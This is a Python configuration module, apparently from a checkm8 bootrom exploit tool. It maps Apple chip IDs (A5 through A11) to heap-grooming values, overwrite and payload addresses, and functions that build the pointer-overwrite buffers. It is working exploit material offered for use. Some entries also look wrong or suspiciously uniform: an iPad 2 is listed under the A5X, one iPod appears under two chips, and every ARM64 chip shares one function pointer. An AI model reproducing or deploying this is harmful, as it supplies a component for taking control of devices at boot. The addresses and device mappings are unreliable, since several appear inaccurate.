"""
Device-specific configurations for checkm8 exploit.

Each config contains the chip-specific parameters needed for the
heap feng shui and overwrite stages of the exploit. Values are
derived from the public ipwndfu/checkra1n research.
"""

import struct


def _make_overwrite_armv7(address):
    """Build the 0x800-byte overwrite buffer for ARMv7 devices (A5-A6X)."""
    buf = bytearray(0x800)
    # Fill callback pointer region with target address
    for i in range(0, 0x800, 4):
        struct.pack_into("<I", buf, i, address)
    return bytes(buf)


def _make_overwrite_arm64(address, func_ptr):
    """Build the 0x800-byte overwrite buffer for ARM64 devices (A7-A11)."""
    buf = bytearray(0x800)
    # Fill with function pointer
    for i in range(0, 0x800, 8):
        struct.pack_into("<Q", buf, i, func_ptr)
    # Place trampoline address at specific offset
    struct.pack_into("<Q", buf, 0x100, address)
    return bytes(buf)


# Device configuration table keyed by CPID
DEVICE_CONFIGS = {
    # ---- ARMv7 devices ----

    0x8942: {
        "name": "A5 (S5L8942)",
        "arch": "armv7",
        "devices": ["iPhone 4S", "iPad 2", "iPod touch 5G"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x84034000,
        "payload_address": 0x84000000,
        "dfu_image_base": 0x34000000,
        "dfu_load_base": 0x84000000,
        "max_size": 0x2C000,
        "exploit_lr": 0x84034000,
    },

    0x8945: {
        "name": "A5X (S5L8945)",
        "arch": "armv7",
        "devices": ["iPad 2 (Rev A)", "iPad 3"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x84034000,
        "payload_address": 0x84000000,
        "dfu_image_base": 0x34000000,
        "dfu_load_base": 0x84000000,
        "max_size": 0x2C000,
        "exploit_lr": 0x84034000,
    },

    0x8947: {
        "name": "A5 Rev A (S5L8947)",
        "arch": "armv7",
        "devices": ["iPhone 4S (Rev A)", "iPad 2 (Rev B)"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x84034000,
        "payload_address": 0x84000000,
        "dfu_image_base": 0x34000000,
        "dfu_load_base": 0x84000000,
        "max_size": 0x2C000,
        "exploit_lr": 0x84034000,
    },

    0x8950: {
        "name": "A6 (S5L8950)",
        "arch": "armv7",
        "devices": ["iPhone 5", "iPod touch 6G"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x10000000,
        "payload_address": 0x10000000,
        "dfu_image_base": 0x10000000,
        "dfu_load_base": 0x10000000,
        "max_size": 0x34000,
        "exploit_lr": 0x10000000,
    },

    0x8955: {
        "name": "A6X (S5L8955)",
        "arch": "armv7",
        "devices": ["iPad 4"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x10000000,
        "payload_address": 0x10000000,
        "dfu_image_base": 0x10000000,
        "dfu_load_base": 0x10000000,
        "max_size": 0x34000,
        "exploit_lr": 0x10000000,
    },

    # ---- ARM64 devices ----

    0x8960: {
        "name": "A7 (S5L8960)",
        "arch": "arm64",
        "devices": ["iPhone 5S", "iPad Air", "iPad Mini 2"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x180380000,
        "payload_address": 0x180000000,
        "dfu_image_base": 0x180000000,
        "dfu_load_base": 0x180000000,
        "max_size": 0x34000,
        "func_ptr": 0x10000CC78,
        "block_size": 0x40,
    },

    0x7000: {
        "name": "A8 (T7000)",
        "arch": "arm64",
        "devices": ["iPhone 6", "iPhone 6 Plus", "iPad Mini 4", "iPod touch 7G"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x180380000,
        "payload_address": 0x180000000,
        "dfu_image_base": 0x180000000,
        "dfu_load_base": 0x180000000,
        "max_size": 0x34000,
        "func_ptr": 0x10000CC78,
        "block_size": 0x40,
    },

    0x7001: {
        "name": "A8X (T7001)",
        "arch": "arm64",
        "devices": ["iPad Air 2"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x180380000,
        "payload_address": 0x180000000,
        "dfu_image_base": 0x180000000,
        "dfu_load_base": 0x180000000,
        "max_size": 0x34000,
        "func_ptr": 0x10000CC78,
        "block_size": 0x40,
    },

    0x8000: {
        "name": "A9 (S8000)",
        "arch": "arm64",
        "devices": ["iPhone 6S", "iPhone 6S Plus", "iPhone SE"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x180380000,
        "payload_address": 0x180000000,
        "dfu_image_base": 0x180000000,
        "dfu_load_base": 0x180000000,
        "max_size": 0x34000,
        "func_ptr": 0x10000CC78,
        "block_size": 0x40,
    },

    0x8003: {
        "name": "A9 (S8003)",
        "arch": "arm64",
        "devices": ["iPhone 6S (Samsung)", "iPhone SE (Samsung)"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x180380000,
        "payload_address": 0x180000000,
        "dfu_image_base": 0x180000000,
        "dfu_load_base": 0x180000000,
        "max_size": 0x34000,
        "func_ptr": 0x10000CC78,
        "block_size": 0x40,
    },

    0x8010: {
        "name": "A10 Fusion (T8010)",
        "arch": "arm64",
        "devices": ["iPhone 7", "iPhone 7 Plus", "iPad 6", "iPad 7", "iPod touch 7G"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x1800B0800,
        "payload_address": 0x180000000,
        "dfu_image_base": 0x180000000,
        "dfu_load_base": 0x180000000,
        "max_size": 0x34000,
        "func_ptr": 0x10000CC78,
        "block_size": 0x40,
    },

    0x8011: {
        "name": "A10X Fusion (T8011)",
        "arch": "arm64",
        "devices": ["iPad Pro 10.5", "iPad Pro 12.9 (2nd gen)", "Apple TV 4K"],
        "large_leak": 0,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x1800B0800,
        "payload_address": 0x180000000,
        "dfu_image_base": 0x180000000,
        "dfu_load_base": 0x180000000,
        "max_size": 0x34000,
        "func_ptr": 0x10000CC78,
        "block_size": 0x40,
    },

    0x8015: {
        "name": "A11 Bionic (T8015)",
        "arch": "arm64",
        "devices": ["iPhone 8", "iPhone 8 Plus", "iPhone X"],
        "large_leak": 1,
        "hole": 6,
        "leak": 1,
        "overwrite_address": 0x1800B0800,
        "payload_address": 0x180000000,
        "dfu_image_base": 0x180000000,
        "dfu_load_base": 0x180000000,
        "max_size": 0x34000,
        "func_ptr": 0x10000CC78,
        "block_size": 0x40,
    },
}


def get_config_for_cpid(cpid):
    """Look up device config by CPID. Returns None if unsupported."""
    return DEVICE_CONFIGS.get(cpid)


def get_overwrite_for_config(config):
    """Generate the overwrite buffer for a given device config."""
    if config["arch"] == "armv7":
        return _make_overwrite_armv7(config["overwrite_address"])
    else:
        return _make_overwrite_arm64(
            config["overwrite_address"],
            config.get("func_ptr", config["overwrite_address"]),
        )


def get_supported_devices():
    """Return a flat list of all supported device names."""
    devices = []
    for cfg in DEVICE_CONFIGS.values():
        devices.extend(cfg["devices"])
    return sorted(set(devices))
